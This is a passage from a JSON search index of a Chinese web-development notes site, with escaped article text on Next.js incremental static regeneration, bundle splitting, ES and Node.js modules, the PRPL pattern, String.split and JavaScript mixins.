key={product.id}\u0026gt;{product.name}\u0026lt;/li\u0026gt; ))} \u0026lt;/ul\u0026gt; \u0026lt;/\u0026gt; ) }   在 60 秒后重新验证页面的代码包含在 getStaticProps() 函数中。 当请求进入可用的静态页面时，首先提供服务。\n每隔一分钟，静态页面就会在后台刷新新数据。 生成后，新版本的静态文件将可用，并将在随后的一分钟内为任何新请求提供服务。\n此功能在 Next.js 9.5 及更高版本中可用。\n\riSSG 优势 iSSG 提供了 SSG 的所有优势，以及更多优势。 以下列表详细介绍了它们。\n  动态数据：\n第一个优势显然是为什么要设想 iSSG。 它能够支持动态数据而无需重建站点。\n  速度：\niSSG 至少与 SSG 一样快，因为数据检索和渲染仍然在后台进行。 客户端或服务器上几乎不需要处理。\n  可用性：\n任何页面的最新版本将始终在线可供用户访问。 即使在后台重新生成失败，旧版本仍然保持不变。\n  一致：\n由于每次在服务器上重新生成一页，因此数据库和后端的负载较低且性能一致。 因此，延迟没有峰值。\n  易于分发：\n就像 SSG 站点一样，iSSG 站点也可以通过用于提供预渲染网页的 CDN 网络进行分发。\n  \r知识点  getStaticPaths() fallback getStaticProps() revalidate  ","description":"建立网站后更新静态内容","id":105,"section":"react-patterns","tags":null,"title":"增量静态生成 ✔","uri":"https://codthing.github.io/react-patterns/render-patterns/incremental-static-rendering/"},{"content":"在构建现代 Web 应用程序时，\n诸如 Webpack 或 Rollup 之类的打包器会获取应用程序的源代码，并将其捆绑到一个或多个包中。\n当用户访问网站时，会请求并加载包，以便将数据显示到用户的屏幕上。\nJavaScript 引擎（如 V8）能够解析和编译用户在加载时请求的数据。\n尽管现代浏览器已经发展为尽可能快速和高效地解析和编译代码，但开发人员仍然负责优化该过程中的两个步骤：\n  请求数据的加载时间和执行时间。\n  确保尽可能缩短执行时间以防止阻塞主线程。\n  尽管现代浏览器能够在包到达时对其进行流式传输，但在用户设备上绘制第一个像素之前仍然需要很长时间。\n捆绑包越大，引擎到达第一次渲染调用所在的行所需的时间就越长。\n在那之前，用户必须盯着空白屏幕很长一段时间，这可能……非常令人沮丧！\n我们希望尽快向用户显示数据。\n更大的包会导致加载时间、处理时间和执行时间增加。\n如果可以减少这个包的大小，以加快速度，那就太好了。\n可以将捆绑包拆分为多个较小的捆绑包，而不是请求一个包含不必要代码的巨大捆绑包！\n通过对应用程序进行捆绑拆分，\n可以减少加载、处理和执行捆绑所需的时间！ 通过减少加载和执行时间，可以减少在用户屏幕上绘制第一个内容之前所花费的时间，\n即 First Contentful Paint，以及将最大组件渲染到屏幕之前所花费的时间，即 Largest 内容丰富的油漆。\n虽然能够在屏幕上看到数据很棒，但不只是想看到内容。 为了拥有一个功能齐全的应用程序，希望用户也能够与之交互！ 用户界面只有在包被加载和执行后才变得交互。 将所有内容绘制到屏幕上并进行交互之前所需的时间称为交互时间。\n更大的包并不一定意味着更长的执行时间。 有可能我们加载了大量用户甚至不会使用的代码！ 也许捆绑包的某些部分只会在特定的用户交互中执行，用户可能会也可能不会这样做！\n在用户能够在屏幕上看到任何内容之前，引擎仍然必须加载、解析和编译在初始渲染中甚至没有使用的代码。 尽管由于浏览器处理这两个步骤的高效方式，解析和编译成本实际上可以被忽略，但获取比必要更大的包可能会损害应用程序的性能。 低端设备或速度较慢的网络上的用户会在获取捆绑包之前看到加载时间显着增加。\n第一部分仍然需要加载和处理，即使引擎只使用文件的最后一部分以便我们可以将这些代码与呈现初始页面所需的代码分开，\n而不是最初请求在当前导航中没有高优先级的部分代码。\n通过将大包拆分成两个较小的包，main.bundle.js 和 emoji-picker.bundle.js，通过获取更少量的数据来减少初始加载时间。\n在这个章节中，介绍了一些方法，这些方法允许将应用程序捆绑拆分成多个较小的捆绑包，并以最有效和性能最好的方式加载资源。\n\r知识点    ","description":"将代码拆分为可重复使用的小块","id":106,"section":"react-patterns","tags":null,"title":"捆绑拆分","uri":"https://codthing.github.io/react-patterns/performance-patterns/bundle-splitting/"},{"content":"随着应用程序和代码库的增长，保持代码的可维护性和分离性变得越来越重要。 模块模式将代码拆分为更小的、可重用的部分。\n除了能够将代码拆分为更小的可重用部分之外，模块还允许您将文件中的某些值保密。 默认情况下，模块内的声明范围（封装）到该模块。 如果我们不明确导出某个值，则该值在该模块之外不可用。 这降低了代码库其他部分中声明的值发生名称冲突的风险，因为这些值在全局范围内不可用。\n\rES6 Modules ES2015 引入了内置的 JavaScript 模块。 模块是一个包含 JavaScript 代码的文件，与普通脚本相比，在行为上有一些不同。\n让我们看一个名为 math.js 的模块的示例，其中包含数学函数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  //math.js function add(x, y) { return x + y; } function multiply(x) { return x * 2; } function subtract(x, y) { return x - y; } function square(x) { return x * x; }   我们有一个包含一些简单数学逻辑的 math.js 文件。我们有一些函数允许用户加、乘、减和得到他们传递的值的平方。\n然而，我们不只是想在 math.js 文件中使用这些函数，我们希望能够在 index.js 文件中引用它们！\n目前，在 index.js 文件中抛出一个错误：在 index.js 文件中没有称为加、减、乘或平方的函数。\n我们正在尝试引用 index.js 文件中不可用的函数。\n1 2 3 4 5 6 7  //index.js  console.log(add(2, 3)); //ReferenceError: add is not defined console.log(multiply(2)); //ReferenceError: multiply is not defined console.log(subtract(2, 3)); //ReferenceError: subtract is not defined console.log(square(2)); //ReferenceError: square is not defined   为了使 math.js 中的函数可用于其他文件，我们首先必须导出它们。\n为了从模块中导出代码，我们可以使用 export 关键字。\n导出函数的一种方法是使用命名导出：我们可以简单地在要公开的部分前面添加 export 关键字。\n在这种情况下，我们希望在每个函数前添加 export 关键字，因为 index.js 应该可以访问所有四个函数。\nexport function add(x, y) {\rreturn x + y;\r}\rexport function multiply(x) {\rreturn x * 2;\r}\rexport function subtract(x, y) {\rreturn x - y;\r}\rexport function square(x) {\rreturn x * x;\r} 我们刚刚使加、乘、减和平方函数可导出！ 但是，仅从模块中导出值不足以使它们对所有文件公开可用。\n为了能够使用从模块导出的值，必须在需要引用它们的文件中显式导入它们。\n必须使用 import 关键字在 index.js 文件顶部引用值。\n为了让 javascript 知道我们想要从哪个模块导入这些函数，我们需要添加一个 from 值和模块的相对路径。\nimport { add, multiply, subtract, square } from \u0026#34;./math.js\u0026#34;; 我们刚刚从 index.js 文件中的 math.js 模块导入了四个函数！ 让我们试试看我们现在是否可以使用这些功能！\n1 2 3 4 5 6 7 8  //index.js import { add, multiply, subtract, square } from \u0026#34;./math\u0026#34;; console.log(add(2, 3)); //5 console.log(multiply(2)); //4 console.log(subtract(2, 3)); //-1 console.log(square(2)); //4   引用错误消失了，现在可以使用从模块导出的值！\n拥有模块的一大好处是我们只能访问使用 export 关键字显式导出的值。没有使用 export 关键字显式导出的值仅在该模块中可用。\n让我们创建一个只能在 math.js 文件中引用的值，称为 privateValue。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  //math.js const privateValue = \u0026#34;这是模块私有的值！\u0026#34;; export function add(x, y) { return x + y; } export function multiply(x) { return x * 2; } export function subtract(x, y) { return x - y; } export function square(x) { return x * x; }   请注意我们没有在 privateValue 前面添加 export 关键字。 由于没有导出 privateValue 变量，所以无法在 math.js 模块之外访问这个值！\n1 2 3 4 5 6  //index.js import { add, multiply, subtract, square } from \u0026#34;./math.js\u0026#34;; console.log(privateValue); /* Error: privateValue is not defined */   通过保持模块的私有值，降低了意外污染全局范围的风险。 不必担心开发人员意外覆盖您的模块创建的值，这些值可能与您的私有值具有相同的名称：它可以防止命名冲突。\n有时，导出的名称可能会与本地值发生冲突。\n1 2 3 4 5 6 7 8 9 10 11  import { add, multiply, subtract, square } from \u0026#34;./math.js\u0026#34;; function add(...args) { return args.reduce((acc, cur) =\u0026gt; cur + acc); } /* Error: add 已经被声明 */ function multiply(...args) { return args.reduce((acc, cur) =\u0026gt; cur * acc); } /* Error: multiply 已经被声明 */   在这种情况下，我们在 index.js 中有名为 add 和 multiply 的函数。 如果我们导入同名的值，最终会发生命名冲突：add 和 multiply 已经被声明了！\n幸运的是，我们可以使用 as 关键字 重命名导入的值。\n让我们将导入的加法和乘法函数重命名为 addValues 和 multiplyValues。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  import { add as addValues, multiply as multiplyValues, subtract, square } from \u0026#34;./math.js\u0026#34;; function add(...args) { return args.reduce((acc, cur) =\u0026gt; cur + acc); } function multiply(...args) { return args.reduce((acc, cur) =\u0026gt; cur * acc); } /* From math.js module */ addValues(7, 8); multiplyValues(8, 9); subtract(10, 3); square(3); /* From index.js file */ add(8, 9, 2, 10); multiply(8, 9, 2, 10);   除了命名导出（仅使用 export 关键字定义的导出）之外，您还可以使用默认导出。 每个模块只能有一个默认导出。\n让我们将 add 函数设为我们的默认导出，并将其他函数保留为命名导出。\n我们可以导出一个默认值，通过在值前面添加导出默认值。\nexport default function add(x, y) {\rreturn x + y;\r}\rexport function multiply(x) {\rreturn x * 2;\r}\rexport function subtract(x, y) {\rreturn x - y;\r}\rexport function square(x) {\rreturn x * x;\r} 命名导出和默认导出之间的区别在于从模块导出值的方式，有效地改变导入值的方式。\n以前，\n 我们必须为命名导出使用方括号： import { module } from \u0026lsquo;module\u0026rsquo;。 使用默认导出，我们可以导入不带括号的值： import module from \u0026lsquo;module\u0026rsquo;  import add, { multiply, subtract, square } from \u0026#34;./math.js\u0026#34;;\radd(7, 8);\rmultiply(8, 9);\rsubtract(10, 3);\rsquare(3); 如果有可用的默认导出，则从不带括号的模块导入的值始终是默认导出的值。\n由于 JavaScript 知道该值始终是默认导出的值，因此我们可以为导入的默认值指定另一个名称，而不是导出时使用的名称。\n例如，我们可以将其称为 addValues，而不是使用名称 add 导入 add 函数。\nimport addValues, { multiply, subtract, square } from \u0026#34;./math.js\u0026#34;;\raddValues(7, 8);\rmultiply(8, 9);\rsubtract(10, 3);\rsquare(3); 即使导出了名为 add 的函数，我们也可以将其导入并调用任何我们喜欢的名称，因为 JavaScript 知道您正在导入默认导出。\n还可以通过使用星号 * 并给出我们希望将模块导入的名称，从模块导入所有导出，即所有命名导出和默认导出。\n导入的值等于一个包含所有导入值的对象。 假设我想将整个模块作为数学导入。\nimport * as math from \u0026#34;./math.js\u0026#34;; 导入的值是 math 对象的属性。\nimport * as math from \u0026#34;./math.js\u0026#34;;\rmath.default(7, 8);\rmath.multiply(8, 9);\rmath.subtract(10, 3);\rmath.square(3); 在这种情况下，我们从一个模块导入所有导出。 执行此操作时要小心，因为您最终可能会导入不必要的值。\n使用 * 仅导入所有导出的值。 模块私有的值在导入模块的文件中仍然不可用，除非您明确导出它们。\n\rReact 使用 React 构建应用程序时，您经常需要处理大量组件。 不是将所有这些组件都写在一个文件中，我们可以将这些组件分开在它们自己的文件中，本质上为每个组件创建一个模块。\n我们有一个基本的待办事项列表，包含一个列表 list、列表项 list items、一个输入字段 input field和一个按钮 button。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  //Button.js import React from \u0026#34;react\u0026#34;; import Button from \u0026#34;@material-ui/core/Button\u0026#34;; const style = { root: { borderRadius: 3, border: 0, color: \u0026#34;white\u0026#34;, margin: \u0026#34;0 20px\u0026#34; }, primary: { background: \u0026#34;linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)\u0026#34; }, secondary: { background: \u0026#34;linear-gradient(45deg, #2196f3 30%, #21cbf3 90%)\u0026#34; } }; export default function CustomButton(props) { return ( \u0026lt;Button {...props} style={{ ...style.root, ...style[props.color] }}\u0026gt; {props.children} \u0026lt;/Button\u0026gt; ); }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  //Input.js import React from \u0026#34;react\u0026#34;; import Input from \u0026#34;@material-ui/core/Input\u0026#34;; const style = { root: { padding: \u0026#34;5px\u0026#34;, backgroundColor: \u0026#34;#434343\u0026#34;, color: \u0026#34;#fff\u0026#34; } }; export default function CustomInput(props, { variant = \u0026#34;standard\u0026#34; }) { return ( \u0026lt;Input style={style.root} {...props} variant={variant} placeholder=\u0026#34;Type...\u0026#34; /\u0026gt; ); }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55  //TodoList.js import React, { useState } from \u0026#34;react\u0026#34;; import { List, ListItem, ListItemText } from \u0026#34;@material-ui/core\u0026#34;; import Input from \u0026#34;./Input\u0026#34;; import Button from \u0026#34;./Button\u0026#34;; function InputRow({ addTodoItem }) { const [input, setInput] = useState(\u0026#34;\u0026#34;); function addTodo() { addTodoItem(input); setInput(\u0026#34;\u0026#34;); } return ( \u0026lt;form\u0026gt; \u0026lt;Input value={input} onChange={(e) =\u0026gt; setInput(e.target.value)} /\u0026gt; \u0026lt;Button onClick={addTodo} color=\u0026#34;primary\u0026#34; variant=\u0026#34;outlined\u0026#34;\u0026gt; Add Item \u0026lt;/Button\u0026gt; \u0026lt;/form\u0026gt; ); } export function TodoList() { const [todos, setTodos] = useState([\u0026#34;Improve JS skills 💪\u0026#34;, \u0026#34;Pet dog 🐶\u0026#34;]); function addTodoItem(todo) { todo.length \u0026amp;\u0026amp; setTodos([...todos, todo]); } function removeTodoItem(i) { todos.splice(i, 1); setTodos([...todos]); } return ( \u0026lt;div className=\u0026#34;todo-list\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Todo Items\u0026lt;/h1\u0026gt; \u0026lt;InputRow addTodoItem={addTodoItem} /\u0026gt; \u0026lt;List\u0026gt; {todos.map((todo, i) =\u0026gt; ( \u0026lt;ListItem key={`${todo}-${i}`}\u0026gt; \u0026lt;ListItemText\u0026gt;{todo}\u0026lt;/ListItemText\u0026gt; \u0026lt;Button color=\u0026#34;secondary\u0026#34; onClick={() =\u0026gt; removeTodoItem(i)}\u0026gt; Remove \u0026lt;/Button\u0026gt; \u0026lt;/ListItem\u0026gt; ))} \u0026lt;/List\u0026gt; \u0026lt;/div\u0026gt; ); }   我们只是将组件拆分到单独的文件中：\n 列表组件的 TodoList.js Button.js 用于自定义 Button 组件 Input.js 用于自定义 Input 组件。  在整个应用程序中，我们不想使用从 material-ui 库导入的默认 Button 和 Input 组件。 相反，我们想要使用我们的自定义版本的组件，通过向其添加自定义样式，在它们的文件中的样式对象中定义。 与其在我们的应用程序中每次都导入默认的 Button 和 Input 组件并一遍又一遍地向其添加自定义样式，\n不如简单地导入一次默认的 Button 和 Input 组件，添加样式，然后导出我们的自定义组件。\n请注意我们如何在 Button.js 和 Input.js 中都有一个名为 style 的对象。 由于此值是模块范围的，我们可以重用变量名称而不会冒名称冲突的风险。\n\r动态导入 当在文件顶部导入所有模块时，所有模块都会在文件的其余部分之前加载。 在某些情况下，只需要根据某个条件导入一个模块。 通过动态导入，可以按需导入模块。\n1 2 3 4 5 6 7 8 9 10 11 12  import(\u0026#34;module\u0026#34;).then(module =\u0026gt; { module.default(); module.namedExport(); }); // Or with async/await (async () =\u0026gt; { const module = await import(\u0026#34;module\u0026#34;); module.default(); module.namedExport(); })();   让我们动态导入前面段落中使用的 math.js 示例。\n该模块仅在用户单击按钮时加载。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  const button = document.getElementById(\u0026#34;btn\u0026#34;); button.addEventListener(\u0026#34;click\u0026#34;, () =\u0026gt; { import(\u0026#34;./math.js\u0026#34;).then((module) =\u0026gt; { console.log(\u0026#34;Add: \u0026#34;, module.add(1, 2)); console.log(\u0026#34;Multiply: \u0026#34;, module.multiply(3, 2)); const button = document.getElementById(\u0026#34;btn\u0026#34;); button.innerHTML = \u0026#34;Check the console\u0026#34;; }); }); /*************************** */ /**** Or with async/await ****/ /*************************** */ // button.addEventListener(\u0026#34;click\u0026#34;, async () =\u0026gt; { // const module = await import(\u0026#34;./math.js\u0026#34;); // console.log(\u0026#34;Add: \u0026#34;, module.add(1, 2)); // console.log(\u0026#34;Multiply: \u0026#34;, module.multiply(3, 2)); // });   通过动态导入模块，我们可以减少页面加载时间。 我们只需要在用户需要时加载、解析和编译用户真正需要的代码。\n除了能够按需导入模块之外，import() 函数还可以接收表达式。 它允许我们传递模板文字，以便根据给定值动态加载模块。\n在上面的示例中，仅当用户单击“单击以加载日期”按钮时才会导入 date.js 模块。 date.js 模块导入第三方的 moment 模块，只有在加载 date.js 模块时才会导入。 如果用户不需要显示日期，我们可以完全避免加载这个第三方库。\n用户单击“单击以加载图像”按钮后，将加载每个图像。 图像是本地 .png 文件，它们根据我们传递给字符串的 num 值加载。\nconst res = await import(`../assets/dog${num}.png`); 这样，我们不依赖于硬编码的模块路径。 它增加了您可以根据用户输入、从外部源接收的数据、函数的结果等导入模块的方式的灵活性。\n\r优点 使用模块模式，可以封装不应公开的代码部分。 这可以防止意外的名称冲突和全局范围污染，从而降低使用多个依赖项和命名空间的风险。 为了能够在所有 JavaScript 运行时中使用 ES2015 模块，需要像 Babel 这样的转译器。\n\r知识点  export 命名导出 import { module } from \u0026lsquo;module\u0026rsquo; 命名导入 as 重命名导入的值 import {a as b} from \u0026lsquo;module\u0026rsquo;, 将a命名为b export default 默认导出 import module from \u0026lsquo;module\u0026rsquo; 默认导入（或者 import a as b from \u0026lsquo;module\u0026rsquo;） * 所有命名导出和默认导出 await import(module) 动态加载  ","description":"将您的代码拆分成更小的、可重用的部分","id":107,"section":"react-patterns","tags":null,"title":"模块模式","uri":"https://codthing.github.io/react-patterns/design-patterns/module-pattern/"},{"content":"使应用程序在全球范围内可访问可能是一个挑战！\n我们必须确保应用程序在低端设备和互联网连接较差的地区运行良好。 为了确保应用程序能够在困难的条件下尽可能高效地加载，可以使用 PRPL 模式。\nPRPL 模式侧重于四个主要的性能考虑：\n  有效地推送关键资源，从而最大限度地减少到服务器的往返次数并减少加载时间。\n  尽快渲染初始路线，提升用户体验\n  为经常访问的路由在后台预先缓存资产，以最大限度地减少对服务器的请求量并实现更好的离线体验\n  延迟加载请求不频繁的路线或资产\n  当我们想要访问一个网站时，首先必须向服务器发出请求才能获取这些资源。\n入口点指向的文件从服务器返回，通常是应用程序的初始 HTML 文件！\n浏览器的 HTML 解析器一开始从服务器接收数据，就会开始解析这些数据。\n如果解析器发现需要更多资源，例如样式表或脚本，则会向服务器发送另一个 HTTP 请求以获取这些资源！\n必须重复请求资源并不是最优的，因为我们正在尝试最小化客户端和服务器之间的往返次数！\n\rHTTP 长期以来，我们使用 HTTP/1.1 来在客户端和服务器之间进行通信。\n尽管与 HTTP/1.0 相比，HTTP/1.1 引入了许多改进，例如能够在使用 keep-alive 标头发送新 HTTP 请求之前保持客户端和服务器之间的 TCP 连接处于活动状态，但仍然存在一些问题 待解决！\n与 HTTP/1.1 相比，HTTP/2 引入了一些重大变化，这使我们可以更轻松地优化客户端和服务器之间的消息交换。\nHTTP/1.1 在请求和响应中使用换行符分隔的纯文本协议，HTTP/2 将请求和响应拆分为称为帧的更小的部分。\n包含标头和正文字段的 HTTP 请求至少被拆分为两个帧：标头帧和数据帧！\nHTTP/1.1 在客户端和服务器之间最多有 6 个 TCP 连接。\n在通过相同的 TCP 连接发送新请求之前，必须先解决先前的请求！\n如果前一个请求需要很长时间才能解决，则此请求会阻止发送其他请求。\n这个常见的问题叫做 head of line 阻塞，会增加某些资源的加载时间！\nHTTP/2 使用双向流，这使得单个 TCP 连接包含多个双向流成为可能，可以在客户端和服务器之间携带多个请求和响应帧！\n一旦服务器收到该特定请求的所有请求帧，它就会重新组合它们并生成响应帧。\n这些响应帧被发送回客户端，客户端重新组合它们。由于流是双向的，可以通过同一个流发送请求和响应帧。\nHTTP/2 通过允许在前一个请求解决之前在同一个 TCP 连接上发送多个请求来解决行首阻塞！\n\rHTTP 2 服务器推送 HTTP/2 还引入了一种更优化的数据获取方式，称为服务器推送。 不必每次都通过发送 HTTP 请求来明确请求资源，服务器可以通过“推送”这些资源来自动发送额外的资源。\n客户端收到附加资源后，这些资源将存储在浏览器缓存中。 当在解析入口文件时发现资源时，浏览器可以快速从缓存中获取资源，而不必向服务器发出 HTTP 请求！\n尽管推送资源减少了接收额外资源的时间，但服务器推送并不支持 HTTP 缓存！ 下次访问该网站时，我们将无法使用推送的资源，必须再次请求。 为了解决这个问题，PRPL 模式在初始加载后使用服务工作者来缓存这些资源，以确保客户端不会发出不必要的请求。\n\r关键资源预加载 作为网站的作者，我们通常知道哪些资源是早期获取的关键，而浏览器会尽力猜测这一点。 幸运的是，可以通过向关键资源添加预加载资源提示来帮助浏览器！\n通过告诉浏览器想要预加载某个资源，就是在告诉浏览器您希望比浏览器发现它更快地获取它！ 预加载是优化加载对当前路由至关重要的资源所需时间的好方法。\n尽管预加载资源是减少往返次数和优化加载时间的好方法，但推送太多文件可能有害。 浏览器的缓存是有限的，可能会通过请求客户端实际上不需要的资源来不必要地使用带宽。\n\rPRPL 模式 PRPL 模式侧重于优化初始负载。 在初始路由完全加载和呈现之前，不会加载其他资源！\n可以通过将应用程序代码拆分成小的、高性能的包来实现这一点。 这些捆绑包应该使用户可以仅在需要时加载他们需要的资源，同时最大限度地提高可缓存性！\n缓存较大的包可能是一个问题。 可能发生多个包共享相同的资源。\n浏览器很难识别 bundle 的哪些部分在多个路由之间共享，因此无法缓存这些资源。\n缓存资源对于减少到服务器的往返次数很重要，并使我们的应用程序离线友好！\n在使用 PRPL 模式时，需要确保请求的包包含当时所需的最少资源，并且可以被浏览器缓存。\n在某些情况下，这可能意味着根本没有捆绑会更高效，可以简单地使用未捆绑的模块！\n通过将浏览器和服务器配置为支持 HTTP/2 推送并有效地缓存资源，可以轻松地模拟通过捆绑应用程序来动态请求最少资源的好处。\n对于不支持 HTTP/2 服务器推送的浏览器，可以创建一个经过优化的构建，以最大限度地减少往返次数。\n客户端不必知道它接收的是捆绑资源还是非捆绑资源：服务器为每个浏览器提供适当的构建。\nPRPL 模式通常使用 app shell 作为其主要入口点，这是一个包含大部分应用程序逻辑并在路由之间共享的最小文件！ 它还包含应用程序的路由器，它可以动态请求必要的资源。\nPRPL 模式确保在初始路由在用户设备上可见之前不会请求或呈现其他资源。 一旦成功加载了初始路由，就可以安装服务器工作者，以便在后台为其他经常访问的路由获取资源！\n由于这些数据是在后台获取的，因此用户不会遇到任何延迟。 如果用户想要导航到 Service Worker 缓存的经常访问的路由，\nService Worker 可以快速从缓存中获取所需的资源，而不必向服务器发送请求。\n不经常访问的路由资源可以动态导入。\n\r知识点   HTTP\n  PRPL\n  ","description":"通过预缓存、延迟加载和最小化往返来优化初始加载","id":108,"section":"react-patterns","tags":null,"title":"PRPL模式","uri":"https://codthing.github.io/react-patterns/performance-patterns/prpl/"},{"content":"split() 方法将一个字符串划分为一个有序的子字符串列表，将这些子字符串放入一个数组中，并返回该数组。 除法是通过搜索模式来完成的； 其中模式作为方法调用中的第一个参数提供。\n\r使用 split 方法将字符串拆分成数组 split 方法将一个字符串分割成一个字符串数组。\n它需要一个参数作为分隔符，它可以是用于拆分字符串或正则表达式的一个字符。\n  如果分隔符是空格，得到一个单词数组\n  如果分隔符是空字符串，得到一个由字符串中每个字符组成的数组。\n  1 2 3 4 5 6  const str = \u0026#34;Hello World\u0026#34;; const bySpace = str.split(\u0026#34; \u0026#34;); // [\u0026#34;Hello\u0026#34;, \u0026#34;World\u0026#34;]  const otherString = \u0026#34;How9are7you2today\u0026#34;; const byDigits = otherString.split(/\\d/); // [\u0026#34;How\u0026#34;, \u0026#34;are\u0026#34;, \u0026#34;you\u0026#34;, \u0026#34;today\u0026#34;]   在 splitify 函数中用 split 方法将 str 分割成单词数组。 这个方法应该返回一个数组。 单词不一定都是用空格分隔，所以数组中不应包含标点符号。\n1 2 3 4 5 6 7 8  function splitify(str) { return str.split(/\\W/); } splitify(\u0026#34;Hello World,I-am code\u0026#34;); // [ \u0026#39;Hello\u0026#39;, \u0026#39;World\u0026#39;, \u0026#39;I\u0026#39;, \u0026#39;am\u0026#39;, \u0026#39;code\u0026#39; ]   ","description":"split() 方法将一个字符串划分为一个有序的子字符串列表，将这些子字符串放入一个数组中，并返回该数组。 除法是通过搜索模式来完成的； 其中模式作为方法调用中的第一个参数提供。","id":109,"section":"javascript","tags":null,"title":"String.prototype.split()","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/split-programming/"},{"content":"Node.js 有一个内置的模块系统。\nNode.js 文件可以导入其他 Node.js 文件公开的功能。\nmodule.exports 1 2 3 4 5 6 7 8 9 10  // car.js const car = { brand: \u0026#39;Ford\u0026#39;, model: \u0026#39;Fiesta\u0026#39; } module.exports = car // index.js const car = require(\u0026#39;./car\u0026#39;)   exports 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  const car = { brand: \u0026#39;Ford\u0026#39;, model: \u0026#39;Fiesta\u0026#39; } exports.car = car // or exports.car = { brand: \u0026#39;Ford\u0026#39;, model: \u0026#39;Fiesta\u0026#39; } const items = require(\u0026#39;./items\u0026#39;) const car = items.car const car = require(\u0026#39;./items\u0026#39;).car const { car } = require(\u0026#39;./items\u0026#39;)   module.exports 和 exports 的区别 第一个公开它指向的对象。后者暴露了它指向的对象的属性。\n","description":"","id":110,"section":"nodejs","tags":null,"title":"使用 exports","uri":"https://codthing.github.io/nodejs/nodebase/node-export/"},{"content":"那些争议最大的编程观点\n","description":"","id":111,"section":"others","tags":null,"title":"有趣的文章","uri":"https://codthing.github.io/others/blog/blog/"},{"content":"mixin 是一个对象，可以使用它来向另一个对象或类添加可重用的功能，而无需使用继承。\n不能单独使用 mixin：它们的唯一目的是在没有继承的情况下向对象或类添加功能。\n\r创建一个 mixin 假设对于我们的应用程序，需要创建多个狗。 然而，创建的基本狗没有任何属性，只有一个名称属性。\nclass Dog {\rconstructor(name) {\rthis.name = name;\r}\r} 一只狗应该能够做的不仅仅是有一个名字。 它应该会吠叫、摇尾巴和玩耍！\n可以创建一个 mixin，为我们提供 bark、wagTail 和 play 属性，而不是直接将其添加到 Dog 中。\nconst dogFunctionality = {\rbark: () =\u0026gt; console.log(\u0026#34;Woof!\u0026#34;),\rwagTail: () =\u0026gt; console.log(\u0026#34;Wagging my tail!\u0026#34;),\rplay: () =\u0026gt; console.log(\u0026#34;Playing!\u0026#34;)\r}; 我们可以使用 Object.assign 方法将 dogFunctionality mixin 添加到 Dog 原型中。\n此方法向目标对象添加属性：在本例中为 Dog.prototype。\nDog 的每个新实例都可以访问 dogFunctionality 的属性，因为它们已添加到 Dog 的原型中！\nclass Dog {\rconstructor(name) {\rthis.name = name;\r}\r}\rconst dogFunctionality = {\rbark: () =\u0026gt; console.log(\u0026#34;Woof!\u0026#34;),\rwagTail: () =\u0026gt; console.log(\u0026#34;Wagging my tail!\u0026#34;),\rplay: () =\u0026gt; console.log(\u0026#34;Playing!\u0026#34;)\r};\rObject.assign(Dog.prototype, dogFunctionality); 创建第一个宠物 pet1，称为 Daisy。\n由于刚刚在 Dog 的原型中添加了 dogFunctionality mixin，Daisy 应该能够走路、睡觉和玩耍！\n1 2 3 4 5 6  const pet1 = new Dog(\u0026#34;Daisy\u0026#34;); pet1.name; // Daisy pet1.bark(); // Woof! pet1.play(); // Playing!   Perfect! Mixins 使我们可以轻松地向类或对象添加自定义功能，而无需使用继承。\n\r从 mixin 继承 虽然可以在没有继承的情况下使用 mixin 添加功能，但 mixin 本身可以使用继承！\n大多数哺乳动物（除了海豚\u0026hellip;\u0026hellip;也许还有更多）也可以走路和睡觉。 狗是哺乳动物，应该会走路和睡觉！\n让我们创建一个添加步行和睡眠属性的 animalFunctionality mixin。\n可以使用 Object.assign 将这些属性添加到 dogFunctionality 原型中。 在这种情况下，目标对象是 dogFunctionality。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  const animalFunctionality = { walk: () =\u0026gt; console.log(\u0026#34;Walking!\u0026#34;), sleep: () =\u0026gt; console.log(\u0026#34;Sleeping!\u0026#34;) }; const dogFunctionality = { bark: () =\u0026gt; console.log(\u0026#34;Woof!\u0026#34;), wagTail: () =\u0026gt; console.log(\u0026#34;Wagging my tail!\u0026#34;), play: () =\u0026gt; console.log(\u0026#34;Playing!\u0026#34;), walk() { super.walk(); }, sleep() { super.sleep(); } }; Object.assign(dogFunctionality, animalFunctionality); //或者 \u0026lt;!-- const dogFunctionality = { __proto__: animalFunctionality, bark: () =\u0026gt; console.log(\u0026#34;Woof!\u0026#34;), wagTail: () =\u0026gt; console.log(\u0026#34;Wagging my tail!\u0026#34;), play: () =\u0026gt; console.log(\u0026#34;Playing!\u0026#34;), walk() { super.walk(); }, sleep() { super.sleep(); } }; --\u0026gt; Object.assign(Dog.prototype, dogFunctionality);   1 2 3 4 5 6 7 8  const pet1 = new Dog(\u0026#34;Daisy\u0026#34;); console.log(pet1.name); //Daisy pet1.bark(); //Woof! pet1.play(); //Playing! pet1.walk(); //Walking! pet1.sleep(); //Sleeping!   Perfect! Dog 的任何新实例现在也可以访问 walk 和 sleep 方法。\n\r浏览器中的 mixin 现实世界中的 mixin 示例在浏览器环境中的 Window 界面上可见。\nWindow 对象从 WindowOrWorkerGlobalScope 和 WindowEventHandlers 混合中实现了它的许多属性，\n这允许我们访问诸如 setTimeout 和 setInterval、indexedDB 和 isSecureContext 等属性。\n由于它是一个 mixin，因此仅用于向对象添加功能，无法创建 WindowOrWorkerGlobalScope 类型的对象。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  window.indexedDB.open(\u0026#34;toDoList\u0026#34;); window.addEventListener(\u0026#34;卸载前\u0026#34;, event =\u0026gt; { event.preventDefault(); event.returnValue = \u0026#34;\u0026#34;; }); window.onbeforeunload = function() { 